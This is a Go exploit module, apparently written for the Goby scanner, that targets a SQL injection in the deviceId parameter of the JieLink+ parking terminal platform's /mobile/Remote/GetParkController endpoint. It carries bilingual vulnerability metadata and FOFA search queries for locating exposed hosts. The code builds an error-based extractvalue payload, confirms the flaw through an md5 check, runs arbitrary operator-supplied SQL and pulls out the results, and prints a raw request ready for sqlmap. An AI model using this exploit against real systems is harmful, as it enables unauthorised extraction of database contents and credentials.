package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JieLink + / mobile/Remote intelligent terminal operation platform/GetParkController SQL Injection Vulnerabilities",
    "Description": "<p>JSOTC2016 fJeLink+ Intelligent terminal operation platform (JSOTC2016 fJeLink+) is the establishment of the core business processing model of JSOTC (user center, rights investment center, financial center, central duty room, operation and maintenance center, etc.), and realize booth charging, toll collection, self-service. It is an intelligent terminal operating platform solution for on-site business processing such as vehicle feature analysis and processing, shift management, business hosting, and information reporting</p><p>An sql injection vulnerability exists in the deviceId parameter of jieLink+ intelligent terminal operating platform. Attackers can exploit this vulnerability to leak sensitive database information.</p>",
    "Product": "Jie-Shun",
    "Homepage": "https://www.jieshun.cn/",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-10-14",
    "Author": "3013320359@qq.com",
    "FofaQuery": "title=\"JieLink+智能终端操作平台\" && body=\"JieLink\"",
    "GobyQuery": "title=\"JieLink+智能终端操作平台\" && body=\"JieLink\"",
    "Level": "3",
    "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.</p>",
    "Recommendation": "<p>1. Please pay attention to the update status on the manufacturer's official website and install updated patches in a timely manner: <a href=\"https://www.jieshun.cn/\">https://www.jieshun.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.  </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/wy876/POC/blob/main/JieLink/JieLink+%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E6%93%8D%E4%BD%9C%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlpoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "database()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "JieLink+智能终端操作平台 /mobile/Remote/GetParkController SQL注入漏洞",
            "Product": "捷顺",
            "Description": "<p>捷顺JeLink+智能终端操作平台(JSOTC2016 fJeLink+)是捷顺实现核心业务处理模型(用户中心、投权中心财务中心中心值班室、 运维中心车行客户端等)的搭建，实现岗亭收费、收费、自助服务，满足车场收费车辆特征分析处理、当班管理、业务托管、信息上报等现场业务处理智能终端操作平台解决方案<br></p><p>jieLink+智能终端操作平台deviceId参数存在sql注入漏洞，攻击者利用此漏洞可导致数据库的敏感信息泄露。<br></p>",
            "Recommendation": "<p>1、请关注厂商官网更新状态，及时安装更新补丁：<a href=\"https://www.jieshun.cn/\">https://www.jieshun.cn/</a></p><p>2、部署Web应⽤防⽕墙，对数据库操作进⾏监控。&nbsp;&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者除了可以利⽤ SQL 注⼊漏洞获取数据库中的信息（例如，管理员后台密码、站点的⽤户个⼈信息）之外，甚⾄在⾼权限的情况可向服务器中写⼊⽊⻢，进⼀步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JieLink + / mobile/Remote intelligent terminal operation platform/GetParkController SQL Injection Vulnerabilities",
            "Product": "Jie-Shun",
            "Description": "<p>JSOTC2016 fJeLink+ Intelligent terminal operation platform (JSOTC2016 fJeLink+) is the establishment of the core business processing model of JSOTC (user center, rights investment center, financial center, central duty room, operation and maintenance center, etc.), and realize booth charging, toll collection, self-service. It is an intelligent terminal operating platform solution for on-site business processing such as vehicle feature analysis and processing, shift management, business hosting, and information reporting</p><p>An sql injection vulnerability exists in the deviceId parameter of jieLink+ intelligent terminal operating platform. Attackers can exploit this vulnerability to leak sensitive database information.<br></p>",
            "Recommendation": "<p>1. Please pay attention to the update status on the manufacturer's official website and install updated patches in a timely manner:&nbsp;<a href=\"https://www.jieshun.cn/\">https://www.jieshun.cn/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to using SQL injection vulnerabilities to obtaininformation in the database (for example, theadministrator's back-end password, the user's personalinformation of the site), an attacker can write a Trojanhorse to the server even in a high-privileged situation tofurther obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`

	sendPayloadlJ0nB1dM := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}

		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		url := `/mobile/Remote/GetParkController`
		//拼接sql语句
		body := fmt.Sprintf("deviceId=1'and/**/extractvalue(1,concat(char(126),%s))and'", sql)
		header := map[string]string{
			"Content-Type":     "application/x-www-form-urlencoded",
			"Cookie":           "DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5",
			"Accept":           "application/json, text/plain, */*",
			"Accept-Language":  "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Accept-Encoding":  "gzip, deflate",
			"X-Requested-With": "XMLHttpRequest",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadlJ0nB1dM
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := `md5('123456')`
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "e10adc3949ba59abbe56e057f20f883") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/mobile/Remote/GetParkController`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadlJ0nB1dM
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`XPATH syntax error: '~(.*?)'`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + match[1]
				fmt.Print(expResult)
				return expResult

			case "sqlpoint":
				sql := ""
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /mobile/Remote/GetParkController HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Cookie: DefaultSystem=Mobile; ASP.NET_SessionId=533gfzuselgriachdgogkug5
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))

}
